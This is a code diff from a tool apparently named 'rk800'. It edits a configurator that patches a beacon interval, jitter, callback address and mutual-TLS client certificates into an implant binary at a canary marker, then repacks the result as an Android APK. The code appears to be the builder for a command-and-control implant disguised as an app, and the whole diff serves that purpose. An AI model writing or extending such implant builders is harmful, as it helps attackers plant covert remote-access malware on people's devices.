@@ -1,6 +1,9 @@
 from rk800.tls_cert import CertManager
+from rk800.apk_repack import APKRepack
 import argparse
 from pathlib import Path
+import struct
+
 
 class Configure:
     DAEMON_CANARY = b"\x41\x39\x31\x54\x21\xff\x3d\xc1\x7a\x45\x1b\x4e\x31\x5d\x36\xc1"
@@ -12,7 +15,6 @@ class Configure:
         self.cert_manager = CertManager()
 
     def _pack_daemon_config(self, args: argparse.Namespace) -> bytes:
-        import struct
 
         beacon_interval_seconds = args.beacon_interval * self.SEC_IN_MIN
         beacon_jitter_seconds = args.beacon_jitter * self.SEC_IN_MIN
@@ -25,7 +27,7 @@ class Configure:
             beacon_interval_seconds,
             beacon_jitter_seconds,
             args.connection_weight,
-            args.address,
+            args.address.encode("utf-8"),
             client_certs["client_key"].encode("utf-8"),
             client_certs["client_cert"].encode("utf-8"),
             client_certs["ca_cert"].encode("utf-8"),
@@ -43,12 +45,10 @@ class Configure:
                 packed_config = self._pack_daemon_config(args)
                 data[canary_index : canary_index + len(packed_config)] = packed_config
 
+        is_64 = "aarch64" in str(self.binary_path)
+        apk_bytes = APKRepack.repack(data, is_64)
+
         with open(output_path, "wb") as output_file:
-            output_file.write(data)
+            output_file.write(apk_bytes)
 
-        print(f"Binary written to {output_path.absolute()}")
-
-        if args and hasattr(args, "beacon_interval"):
-            print(f"Beacon interval: {args.beacon_interval} minutes")
-            print(f"Beacon jitter: {args.beacon_jitter} minutes")
-            print(f"Connection weight: {args.connection_weight}")
+        print(f"APK written to {output_path.absolute()}")
